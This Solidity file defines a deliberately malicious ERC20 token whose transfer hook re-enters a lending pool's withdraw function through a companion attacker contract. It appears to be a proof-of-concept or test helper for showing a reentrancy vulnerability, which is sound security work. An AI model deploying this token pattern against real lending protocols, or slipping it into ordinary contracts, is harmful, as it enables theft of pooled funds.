// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./ReentrancyAttacker.sol";

interface ILendingPool {
    function withdraw(address _asset, uint256 _shares) external;
}

contract MaliciousERC20 is ERC20, Ownable {
    ILendingPool private lendingPool;
    address private attackerContractAddress;

    constructor(address _lendingPool) ERC20("Malicious Token", "MTKN") Ownable(msg.sender) {
        lendingPool = ILendingPool(_lendingPool);
    }

    function setAttacker(address _attacker) public onlyOwner {
        attackerContractAddress = _attacker;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function _update(address from, address to, uint256 value) internal override {
        // This is the hook for the re-entrancy attack.
        // When the pool tries to transfer the malicious token out during a withdraw,
        // we re-enter the pool.
        if (from == address(lendingPool) && to == attackerContractAddress) {
            ReentrancyAttacker(payable(attackerContractAddress)).reenter();
        }
        super._update(from, to, value);
    }
}
